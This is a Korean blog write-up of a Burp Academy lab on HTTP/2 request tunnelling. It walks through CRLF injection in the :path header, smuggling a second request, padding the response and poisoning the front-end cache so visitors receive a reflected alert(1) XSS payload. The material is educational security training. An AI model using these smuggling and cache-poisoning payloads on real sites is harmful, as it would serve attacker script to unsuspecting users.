---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Bypassing access controls via HTTP/2 request tunnelling"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-02-29 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. HTTP 프로토콜2를 사용하는 서버에 대한 스머글링을 사용한다.
- 문제 주소: https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling
- 취약점 설명페이지: https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling
- 난이도: EXPERT (어려움)

# 취약점 개요: HTTP 요청 터널링을 통한 웹 캐시 포이즈닝 
- 리퀘스트 터널링은 기본적으로 유저 자기 자신에게만 커넥션이 할당되므로 기존의 스머글링 공격이 통하지 않는다. 그래도 어떤 경우에는 공격이 가능한 경우가 있다. 
- 예를 들어, 리퀘스트 터널링이 가능한 사이트에 다음과 같은 인코딩되지 않은 유저 입력을 응답에 회신해주는 엔드포인트가 있다고 하자. 

```http
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

Content-Type이 json이기 때문에 이 자체로는 XSS가 가능하지 않지만, 리퀘스트 터널링을 통해 하나의 응답에 여러개의 응답이 혼재하는 경우에는 가능해지는 경우가 있다. 다음과 같은 경우다. 메인 응답의 Content-Type이 `text/html`이기 때문에 `<script></script>`부분을 만나면 웹 브라우저가 코드를 실행시키게 된다! 여기에 더해 프론트엔드 서버가 응답을 캐시하는 경우 웹 캐시 포이즈닝이 가능해지게 된다. 

![리퀘스트 터널링을 통한 XSS](/images/burp-academy-hrs-18-1.png)

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 HTTP/2 요청을 백엔드에 전송할 때 HTTP1으로 다운그레이드한다. 그리고 인커밍 헤더를 적절히 새니타이즈하지 못한다. 이로 인해서 스머글링이 가능하다. 
- 랩을 풀려면 캐시를 오염시켜 victim을 홈페이지에 접근시켜, 브라우저에서 alert(1)이 실행되도록 하면 된다. 
- victim은 15초마다 홈 페이지에 접근한다. 
- 프론트 엔드 서버는 백엔드를 향한 커넥션을 재사용하지 않기 때문에 (유저에 따라 각각 다른 커넥션을 사용하기 때문에) 기존의 HTTP 요청 스머글링에 대해서는 취약하지 않다. 그렇지만 여전히 요청 터널링에 대해서는 취약하다. 
- 힌트: 프론트엔드 서버는 몇 개의 클라이언트 인증헤더를 들어오는 요청에 붙여준다. 문제를 풀려면 이 헤더들을 노출시키는 방법을 찾아야 한다. 

```
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.

To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling.
```

# 풀이 시도
1. 일단 문제 사이트를 관찰해본다. 다음과 같은 응답 헤더를 보아 캐시가 동작하는 것을 알 수 있다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 8605

```

2. 다음으로 `<script>`가 그대로 응답에 나타나는 엔드포인트를 찾는다. 

3. 음... 못 찾겠다. 답을 슬쩍 본다. `GET /resources` 가 해당되는 엔드포인트인 것을 확인했다. 

![취약한 엔드포인트 확인](/images/burp-academy-hrs-18-2.png)

4. CLRF 인젝션으로 요청 터널링이 가능한 헤더를 찾는다. `:path` 헤더에 다음과 같은 페이로드로 CRLF 인젝션을 시도해보면 200응답이 확인되므로 삽입이 가능한 것을 알 수 있다. 

```http
/?cachebuster=1 HTTP/1.1\r\n
Foo: bar
```

![CLRF 인젝션](/images/burp-academy-hrs-18-3.png)

참고로 여기서 백엔드 서버가 보는 CRLF 인젝션된 후의 HTTP요청은 다음과 같이 생겼다. CRLF 때문에 HTTP/2 헤더가 Foo 헤더의 값으로 바뀐 것을 알 수 있다! 

```http
GET /?cachebuster=1 HTTP/1.1
Foo: bar HTTP/2
Host: 0a170092040d582482b0bb19005a0052.web-security-academy.net
Cache-Control: no-cache


```


5. 요청 메서드를 HEAD로 바꾸고, 페이로드를 다음과 같이 바꾼다. 게시글을 보는 요청을 스머글링한다. 

```http
/?cachebuster=2 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /post?postId=1 HTTP/1.1\r\n
Foo: bar
```

![패이로드 설정](/images/burp-academy-hrs-18-4.png)

백엔드가 보는 요청은 이렇게 생겼을 것이다.

```http
GET /?cachebuster=2 HTTP/1.1
Host: 0a170092040d582482b0bb19005a0052.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Foo: bar HTTP/2
Host: 0a170092040d582482b0bb19005a0052.web-security-academy.net
Cache-Control: no-cache
```

6. 그러면 다음과 같이 스머글링한 요청의 응답이 회신되는 것을 볼 수 있다. HTTP요청 터널링에 성공했다. 

![HTTP요청 터널링 성공](/images/burp-academy-hrs-18-5.png)

7. 페이로드를 다음과 같이 바꾼다. 반사형 XSS가 동작하는 엔드포인트다. 

```http
/?cachebuster=3 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
Foo: bar
```

![반사형 XSS가 동작하는 엔드포인트로 변경](/images/burp-academy-hrs-18-6.png)

8. 요청을 보내보면 타임아웃 에러가 발생하는 것을 볼 수 있다. 이는 메인 요청의 응답 크기가 8657바이트이기 때문에 프론트엔드 서버가 이 바이트만큼의 데이터가 오기를 기다리기 때문이다. 스머글링 요청이 회신하는 응답은 크기가 작기 때문에 이 크기를 키워줄 필요가 있다. 

![타임아웃 에러 발생](/images/burp-academy-hrs-18-7.png)

9. 9000바이트정도 의미없는 데이터를 `<script>alert(1)</script>`뒤에 붙인다. 이러면 스머글링 응답의크기가 9000바이트만큼 커질 것이다. 

![의미없는 데이터 세팅](/images/burp-academy-hrs-18-9.png)

10. 요청을 보내보면 타임아웃이 없어지고 XSS페이로드 삽입이 성공한 것을 볼 수 있다. HTTP응답의 Content-Type도 text/html이기 때문에 자바스크립트 코드가 실행될 것이다. 

![XSS 응답 확인](/images/burp-academy-hrs-18-8.png)

11. 이제 Path 에 지정했던 cachebuster 파라메터를 제거한다. 이래야 일반 유저에게 도달하는 페이지를 오염시키게 된다. (일반유저가 cachebuster파라메터를 붙여서 사이트에 접속하지는 않을 것이기 때문에)

제거 후에 요청을 보내보면 캐시 때문에 프론트엔드 서버가 기존에 저장되어 있던 응답을 반환한다. 요청을 계속 보내서 XSS응답이 새롭게 캐시되도록 만든다. 

12. 그리고 웹 사이트에 접속하면 alert창이 뜨는 것을 볼 수 있다. 이 상태로는 정상적인 화면을 볼 수 없으므로 `?cachebuster=1`를 붙여서 랩에 접속하면 문제 풀이에 성공했다는 메세지가 출력된다. 

![풀이 성공](/images/burp-academy-hrs-18-10.png)